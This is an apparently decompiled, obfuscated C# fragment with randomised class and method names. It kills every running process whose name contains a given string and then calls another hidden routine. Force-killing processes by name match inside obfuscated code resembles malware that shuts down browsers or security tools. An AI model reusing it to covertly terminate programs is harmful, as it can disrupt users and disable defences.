using System;
using System.Diagnostics;

namespace FEPAnxLYcpgz;

public sealed class rYWGZJzIIVRAR
{
	public static bool HdWJvpUfDaUmF(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void VYxVsrDZXjexL(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (HdWJvpUfDaUmF(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					ZNYsMUGPdZxeAunY.fFuUiPjGkyEIjnd();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
